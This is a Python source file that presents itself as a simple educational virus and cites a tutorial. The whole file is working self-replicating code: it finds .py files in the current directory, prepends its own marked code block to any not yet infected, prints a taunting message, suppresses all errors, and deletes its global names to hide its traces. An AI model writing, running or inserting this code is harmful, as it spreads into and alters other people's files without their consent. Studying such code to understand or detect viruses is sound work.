#!/usr/bin/env python3

"""A simple virus implementation in Python.

In practice we wouldn't do it using an interpreted language such as Python,
Instead you would use C or Assembly. But this is to provide an example.
The idea is to find files, copy the virus code in them, the virus code itself
has the functions to infect other files.

Reference: https://thepythoncorner.com/posts/2021-08-30-how-to-create-virus-python/
"""

# begin virus

import glob

def find_files_to_infect(directory="."):
    files = [file for file in glob.glob("*.py")]

    return files

def get_content_of_file(file):
    data = None
    with open(file, "r") as f:
        data = f.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)

    for line in data:
        # if it's already infected, the job is done!
        if "# begin virus" in line:
            return None

    return data

def infect(file, virus_code):
    # := is the new walrus operator
    # https://stackoverflow.com/questions/26000198/what-does-colon-equal-in-python-mean
    if(data := get_content_if_infectable(file)):
        with open(file, "w") as f:
            f.write("".join(virus_code))
            # writelines is used to write a list of strings
            f.writelines(data)

def get_virus_code():
    """Get the virus code from current file.

    This function reads the lines between the `# begin virus` and `# end virus`
    pragmas and returns the lines.

    Returns:
        virus_code (List(str)): List of lines of virus code.

    """
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin virus\n" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end virus\n" in line:
            virus_code_on = False
            break

    return virus_code

def payload():
    print("This file has been infected! You will not have a good day!")


try:
    virus_code = get_virus_code()

    for file in find_files_to_infect():
        infect(file, virus_code)

    payload()

except:
    pass

finally:
    # delete used names from memory, to make sure the virus code 
    # doesn't affect the functionality of the non-infected script
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end virus
